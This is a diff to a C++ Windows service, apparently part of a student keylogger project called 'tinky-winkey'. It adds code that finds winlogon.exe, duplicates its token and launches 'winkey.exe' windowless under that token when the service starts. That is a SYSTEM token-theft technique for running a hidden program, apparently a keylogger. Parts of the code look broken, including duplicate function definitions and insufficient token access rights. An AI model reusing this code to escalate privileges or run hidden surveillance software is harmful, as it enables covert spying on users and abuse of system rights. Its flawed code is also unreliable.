@@ -2,6 +2,7 @@
 #include <tchar.h>
 #include <iostream>
 #include "tinky.h"
+#include <Tlhelp32.h>
 
 
 SC_HANDLE               scmH;
@@ -9,7 +10,8 @@ SC_HANDLE               serviceH;
 SERVICE_STATUS_HANDLE   g_StatusHandle;
 SERVICE_STATUS          g_ServiceStatus;
 HANDLE                  g_ServiceStopEvent;
-
+HANDLE                  newExecToken;
+PROCESS_INFORMATION     winkeyPI;
 
 
 void usage() {
@@ -69,7 +71,6 @@ void SvcInstall()
         return;
     }
     strcat(Path, "\\tinky.exe");
-    printf("%s\n", Path);
 
     schService = CreateService(
         scmH,              // SCM database 
@@ -109,6 +110,26 @@ void StopSvc() {
     if (!ControlService(serviceH, SERVICE_CONTROL_STOP, &g_ServiceStatus)) {
         printf("Stop Service failed (%d)\n", GetLastError());
     }
+}
+
+DWORD GetPidByName(const char* filename)
+{
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(PROCESSENTRY32);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, filename) == 0)
+        {
+            printf("%lu", pEntry.th32ProcessID);
+            CloseHandle(hSnapShot);
+            return(pEntry.th32ProcessID);
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+    return(0);
 }
 
 int main(int argc, CHAR **argv)
@@ -174,6 +195,54 @@ int main(int argc, CHAR **argv)
     }
 }
 
+DWORD GetPidByName()
+{
+    char* filename = "winlogon.exe";
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(PROCESSENTRY32);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, filename) == 0)
+        {
+            printf("%lu", pEntry.th32ProcessID);
+            CloseHandle(hSnapShot);
+            return(pEntry.th32ProcessID);
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+    return(0);
+}
+
+void    Tinky_Winky() {
+    DWORD winlogonPID;
+    HANDLE wlPH;
+    HANDLE wlTH;
+    HANDLE newExecToken;
+    char Path[260];
+    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+
+    winlogonPID = GetPidByName();
+    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
+    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
+        printf("opt\n");
+    }
+    CloseHandle(wlPH);
+    if (!DuplicateTokenEx(wlTH, TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
+        printf("dtEx\n");
+    }
+    CloseHandle(wlTH);
+    GetCurrentDirectory(260, Path);
+    strcat(Path, "\\winkey.exe 1337");
+    int i = 0;
+
+    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
+        printf("cpwt\n");
+    }
+}
+
 VOID WINAPI ServiceMain() {
     DWORD Status = E_FAIL;
 
@@ -190,6 +259,7 @@ VOID WINAPI ServiceMain() {
     }
     ReportStatus(SERVICE_RUNNING, NO_ERROR);
     // execute winkey here
+    Tinky_Winky();
     WaitForSingleObject(g_ServiceStopEvent, INFINITE);
     ReportStatus(SERVICE_STOPPED, NO_ERROR);
     return;
@@ -237,27 +307,4 @@ void ReportStatus(DWORD state, DWORD Q_ERROR) {
         0,
     };*/
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-}
-
-void GetPidByName(const char* filename)
-{
-    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
-    PROCESSENTRY32 pEntry;
-    pEntry.dwSize = sizeof(pEntry);
-    BOOL hRes = Process32First(hSnapShot, &pEntry);
-    while (hRes)
-    {
-        if (strcmp(pEntry.szExeFile, filename) == 0)
-        {
-            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
-                (DWORD)pEntry.th32ProcessID);
-            if (hProcess != NULL)
-            {
-                printf(hProcess);
-                CloseHandle(hProcess);
-            }
-        }
-        hRes = Process32Next(hSnapShot, &pEntry);
-    }
-    CloseHandle(hSnapShot);
 }
